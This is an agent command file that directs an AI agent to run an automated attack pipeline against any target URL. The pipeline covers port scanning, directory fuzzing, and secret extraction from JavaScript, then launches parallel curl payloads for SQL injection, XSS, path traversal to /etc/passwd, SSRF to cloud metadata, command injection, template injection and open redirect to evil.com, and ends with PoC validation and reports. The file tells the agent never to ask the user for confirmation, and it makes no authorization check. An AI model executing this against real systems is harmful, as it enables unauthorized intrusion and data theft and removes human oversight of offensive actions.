---
description: Autonomous attack pipeline with parallel scanning. Runs full recon → exploitation → validation → reporting chain automatically.
agent: noir
subtask: false
---

You are running the autonomous attack pipeline against $ARGUMENTS. Follow every step below in order.

Do not ask the user for confirmation between phases. Execute each phase fully before moving to the next. If a phase fails, log the failure and continue.

**IMPORTANT: Parallel execution.** Steps marked `[PARALLEL]` must be executed concurrently. Use the Task tool to launch multiple operations simultaneously. Do not wait for one to finish before starting the next.

---

## Step 0: Parse Target

Extract the domain and hostname from the target URL:
```python
from urllib.parse import urlparse
parsed = urlparse("$ARGUMENTS")
host = parsed.hostname
port = parsed.port or (443 if parsed.scheme == 'https' else 80)
domain = f"{host}:{port}" if port not in (80, 443) else host
```

Create directory: `mkdir -p noir_reports/<domain>/`

---

## Step 1: Recon [PARALLEL]

Run all three recon tasks simultaneously:

**Task A — Port Scan:**
```bash
nmap -sS -sV -p 80,443,8000,8080,8443,3000,5000,9000 -T4 <host> -oN noir_reports/<domain>/nmap.txt
```

**Task B — HTTP Probe (for each known port):**
```bash
curl -sI <scheme>://<host>:<port>
curl -s <scheme>://<host>:<port> | head -100
```

**Task C — Directory Fuzzing:**
```bash
printf "api\nadmin\nlogin\nbackup\nconfig\n.git\nwp-admin\nwp-json\nactuator\nswagger\ngraphql\nhealth\nstatus\nmetrics\nenv\ndebug\ntest\nstaging\nv1\nv2" > /tmp/noir_words.txt
ffuf -w /tmp/noir_words.txt -u <base_url>/FUZZ -mc 200,301,302,403 -s -t 30
```

Wait for all three to complete. Merge discovered endpoints into `noir_reports/<domain>/endpoints.txt`.

---

## Step 2: JS Analysis + Cache [PARALLEL]

**Task A — JavaScript extraction:**
```bash
curl -s <base_url> | grep -oP 'src=["'"'"'][^"'"'"']+\.js["'"'"']' | cut -d'"' -f2
```
For each JS file, extract API endpoints and secrets.

**Task B — Cache response hashes for all endpoints:**
For each endpoint in `endpoints.txt`:
```bash
body=$(curl -s <endpoint> 2>/dev/null || echo "")
hash=$(echo -n "$body" | sha256sum | cut -d' ' -f1)
result=$(python tools/db.py check <endpoint> "$hash")
python tools/db.py cache <endpoint> "$hash"
```
If `check` returns `UNCHANGED: skipping`, add to `noir_reports/<domain>/skipped.txt` and exclude from further testing.

Merge new endpoints from JS analysis into `endpoints.txt`. Remove skipped endpoints.

---

## Step 3: Browser-Based Scanning [PARALLEL]

Launch this step alongside Step 4 (vulnerability scanning). Run as independent concurrent operations.

**Browser scan on base URL + top discovered endpoints:**
```bash
pip install playwright && playwright install chromium 2>/dev/null || true
python tools/browser_scanner.py <base_url> --max-pages 30 --output noir_reports/<domain>/browser/
```

The browser scanner detects:
- DOM XSS sinks (innerHTML, eval, document.write)
- Cookie security flags (HttpOnly, Secure, SameSite)
- CSP headers (missing, weak, unsafe-inline)
- Clickjacking (X-Frame-Options, CSP frame-ancestors)
- Form CSRF tokens
- Form injection vulnerabilities (XSS, SQLi, SSTI via form submission)
- Client-side routes (SPA route discovery)

Merge findings from `noir_reports/<domain>/browser/browser_*.json` into `potential_findings.md`.

Use `noir-tool-browser-scanning` skill for detailed instructions.

---

## Step 4: Vulnerability Scanning [PARALLEL]

This is the core parallel step. For each endpoint, run ALL 8 vulnerability checks simultaneously:

**Launch 8 parallel tasks per endpoint:**

**Task SQLi (noir-vuln-sqli):**
```bash
curl -s "<endpoint>?id=1'"
curl -s "<endpoint>?id=1' OR 1=1--"
curl -s "<endpoint>?search=' UNION SELECT NULL--"
```
Match: `sql syntax`, `sqlite3.error`, `mysql`, `postgres`, `ORA-`

**Task XSS (noir-vuln-xss):**
```bash
curl -s "<endpoint>?q=<script>alert(1)</script>"
curl -s "<endpoint>?q=<img src=x onerror=alert(1)>"
```
Match: payload reflected unsanitized

**Task LFI (noir-vuln-path-traversal):**
```bash
curl -s "<endpoint>?file=../../../etc/passwd"
curl -s "<endpoint>?page=....//....//....//etc/passwd"
```
Match: `root:x:0:0`

**Task SSRF (noir-vuln-ssrf):**
```bash
curl -s "<endpoint>?url=http://169.254.169.254/latest/meta-data/"
curl -s "<endpoint>?url=http://127.0.0.1:22/"
```
Match: metadata content, internal service banners

**Task IDOR (noir-vuln-idor):**
```bash
curl -s "<endpoint>/1"
curl -s "<endpoint>/2"
```
Match: different user data returned without auth change

**Task RCE (noir-vuln-rce):**
```bash
curl -s "<endpoint>?cmd=;id"
curl -s "<endpoint>?cmd=$(id)"
```
Match: `uid=`, command output

**Task SSTI (noir-vuln-ssti):**
```bash
curl -s "<endpoint>?name={{7*7}}"
curl -s "<endpoint>?name=${7*7}"
```
Match: `49` in response

**Task Open Redirect (noir-vuln-open-redirect):**
```bash
curl -sI "<endpoint>?next=http://evil.com" | grep -i "location:"
curl -sI "<endpoint>?redirect=http://evil.com" | grep -i "location:"
```
Match: `Location:` header pointing to `evil.com`

Collect all potential findings from all parallel tasks into `noir_reports/<domain>/potential_findings.md`.

---

## Step 5: Validation + Scoring [PARALLEL]

For each potential finding, run validation, CVSS scoring, and remediation generation simultaneously:

**Task A — PoC Validation:**
Write a standalone Python PoC and execute it:
```python
import urllib.request, sys
try:
    req = urllib.request.urlopen("<endpoint>?<payload>")
    content = req.read().decode('utf-8')
    if "<indicator>" in content:
        sys.exit(0)
except Exception as e:
    if "<indicator>" in str(e).lower():
        sys.exit(0)
sys.exit(1)
```
Only mark as VALIDATED if exit code is 0.

**Task B — CVSS Scoring (noir-vuln-cvss):**
For each validated finding:
1. Determine CVSS 4.0 vector based on exploitation context
2. Calculate score
3. Assign severity band (Critical/High/Medium/Low)

**Task C — Remediation (noir-vuln-remediation):**
For each validated finding:
1. Select language-specific fix pattern
2. Generate BAD/GOOD code block

---

## Step 6: Persist + Report

**Persist to database:**
```bash
python tools/db.py add '{"target": "<domain>", "vuln_type": "...", "endpoint": "...", "payload": "...", "severity": "<severity>", "cvss": <score>, "poc": "...", "evidence": "..."}'
```

**Save scan summary:**
```bash
python tools/db.py scan '{"target": "<domain>", "endpoints": <count>, "potential": <count>, "validated": <count>}'
```

**Generate report** at `noir_reports/<domain>/report_<timestamp>.md`:
- Summary table with CVSS scores and severity
- Each finding: type, endpoint, CVSS vector, severity, payload, PoC, evidence, remediation
- Findings sorted by CVSS score (highest first)

**Generate todos** at `noir_reports/<domain>/todos.md`:
- Endpoints not yet tested
- Deferred checks (race conditions, auth bypass, business logic)
- Follow-up ideas

---

## Step 7: Output

```
Attack complete for $ARGUMENTS
  Endpoints discovered: <count>
  Skipped (unchanged):  <count>
  Potential vulnerabilities: <count>
  Validated findings: <count>
  Report: noir_reports/<domain>/report_<timestamp>.md
  Todos:  noir_reports/<domain>/todos.md
  Query:  python tools/db.py query "SELECT * FROM findings WHERE target='<domain>'"
```
